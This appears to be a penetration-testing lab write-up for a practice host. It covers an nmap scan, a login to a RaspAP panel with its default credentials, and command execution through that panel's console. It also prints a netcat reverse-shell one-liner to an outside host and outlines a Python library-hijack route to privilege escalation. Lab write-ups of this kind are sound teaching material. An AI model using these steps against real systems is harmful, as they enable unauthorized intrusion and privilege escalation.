**IP:** `192.168.113.97`

---

## TARGET / OS & TECH
- **OS/TECH:** Debian
- **Notable apps:** RaspAP (web GUI), lighttpd 1.4.53
- **Mgmt UI on 8091:** Couchbase-like favicon observed, but headers show **RaspAP** realm

---

## USERS / CREDENTIALS (seen)
```
janis
paige
terry
walter
```
Web UI default worked: `admin:secret` (RaspAP)

---

## SERVICES (quick view)
- `8091/tcp` HTTP → **RaspAP login (Basic auth)** → realm `"RaspAP"` → default creds `admin:secret` **worked**
- `25/tcp` SMTP → Postfix (banner: `walla ESMTP Postfix (Debian/GNU)`)
- `23/tcp` Telnet → Linux telnetd (login/pass unknown)
- `53/tcp` tcpwrapped
- `22/tcp`, `422/tcp`, `42042/tcp` → OpenSSH 7.9p1

---

## NMAP (focused scan on 8091)
```
PORT     STATE SERVICE VERSION
8091/tcp open  http    lighttpd 1.4.53
| http-headers: 
|   Set-Cookie: PHPSESSID=rogefvdqj0hrnhn86iqp5j4qvf; path=/
|   Expires: Thu, 19 Nov 1981 08:52:00 GMT
|   Cache-Control: no-store, no-cache, must-revalidate
|   Pragma: no-cache
|   WWW-Authenticate: Basic realm="RaspAP"
|   Content-type: text/html; charset=UTF-8
|   Content-Length: 15
|   Connection: close
|   Date: Tue, 02 Sep 2025 14:41:45 GMT
|   Server: lighttpd/1.4.53
|   
|_  (Request type: GET)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

---

## FULL NMAP
```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
23/tcp    open  telnet     Linux telnetd
|_banner: Linux Telnetd 0.17
25/tcp    open  smtp       Postfix smtpd
|_banner: 220 walla ESMTP Postfix (Debian/GNU)
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
8091/tcp  open  http       lighttpd 1.4.53
|_http-server-header: lighttpd/1.4.53
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## WEB FINDINGS (RaspAP)
- Header `WWW-Authenticate: Basic realm="RaspAP"` confirms RaspAP.
- Default credentials **`admin:secret`** successfully authenticated.
- RaspAP **Console** provided command execution; enumerated local users:
  - `janis`, `paige`, `terry`, `walter`
- First flag found under `/home/walter`.

---

## INITIAL ACCESS (lab notes)
**Reverse shell (as observed in lab)**:
```bash
nc -e /bin/bash 192.168.45.170 80
```
After triggering from the RaspAP console, a reverse shell was received.

---

## POST-EXPLOIT / LOCAL ENUM
- In `/home/walter` discovered `wifi_reset.py`:
  - Python 2 script (`#!/usr/bin/python`), imports `wificontroller` module.
  - Writable by `www-data` and executed from a context that calls its module functions.
  - **Observation:** Classic Python library hijack opportunity if a privileged context executes this script and searches the current directory for `wificontroller.py`.
  - For safe proof-of-execution, create a benign `wificontroller.py` implementing `stop/reset/start` and log UID/GID to `/tmp/` when the script runs.

_Example proof-only snippet used in lab notes (Python 2):_
```python
# /home/walter/wificontroller.py
import os
def _p(t):
    open('/tmp/wifi_hijack_proof.txt','a').write('%s uid=%d gid=%d\n' % (t, os.getuid(), os.getgid()))
def stop(i,a):  _p('stop')
def reset(i,a): _p('reset')
def start(i,a): _p('start')
```
Then:
```bash
python2 /home/walter/wifi_reset.py
cat /tmp/wifi_hijack_proof.txt   # shows execution context
```

